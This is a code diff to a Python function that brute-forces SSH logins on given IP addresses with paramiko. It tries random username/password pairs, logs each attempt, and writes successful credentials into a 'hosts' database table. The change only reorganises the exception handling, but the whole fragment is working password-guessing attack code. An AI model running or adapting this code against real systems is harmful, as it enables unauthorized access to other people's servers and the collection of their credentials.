@@ -82,46 +82,46 @@ def process_host(ip_address, usernames, passwords):
             password = random.choice(passwords)
             retries = 0
             while retries < MAX_RETRIES:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
                 try:
-                    client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
-
-                    try:
-                        client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
-                        print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
-                        cur = conn.cursor()
-                        cur.execute("UPDATE hosts SET ssh_login = %s WHERE ip_address = %s", (f"{username}:{password}", str(ip_address)))
-                        conn.commit()
-                    except paramiko.AuthenticationException:
-                        # Incorrect credentials, continue to the next one
-                        break
-                    except paramiko.SSHException:
-                        print(f"{RED}Failed to connect to {RESET}{ip_address}")
-                        break
-                    except socket.timeout:
-                        print(f"{RED}Connection timed out for {RESET}{ip_address}")
-                        break
-                    except paramiko.ssh_exception.NoValidConnectionsError as e:
-                        print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
-                        print(f"{RED}Error: {RESET}{str(e)}")
-                        break
-                    except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
-                        print(f"{RED}Connection reset. Retrying...")
-                        retries += 1
-                        time.sleep(1)  # Wait for 1 second before retrying
-                        continue
-                    finally:
-                        client.close()
+                    client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
+                    print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
+                    cur = conn.cursor()
+                    cur.execute("UPDATE hosts SET ssh_login = %s WHERE ip_address = %s", (f"{username}:{password}", str(ip_address)))
+                    conn.commit()
                     break
+                except paramiko.AuthenticationException:
+                    # Incorrect credentials, continue to the next one
+                    break
+                except paramiko.SSHException:
+                    print(f"{RED}Failed to connect to {RESET}{ip_address}")
+                    break
+                except socket.timeout:
+                    print(f"{RED}Connection timed out for {RESET}{ip_address}")
+                    break
+                except paramiko.ssh_exception.NoValidConnectionsError as caught_error:
+                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
+                    print(f"{RED}Error: {RESET}{str(caught_error)}")
+                    break
+                except (ConnectionResetError, paramiko.ssh_exception.SSHException) as caught_error:
+                    print(f"{RED}Connection reset. Retrying...")
+                    retries += 1
+                    time.sleep(1)  # Wait for 1 second before retrying
+                    continue
                 except Exception as caught_error:
                     print(f"{RED}Error occurred: {RESET}{str(caught_error)}")
                     traceback.print_exc()
                     break
+                finally:
+                    client.close()
             if retries >= MAX_RETRIES:
                 print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
     except Exception as caught_error:
         print(f"{RED}Error occurred while processing {ip_address}: {str(caught_error)}")
+
+
 
 
 
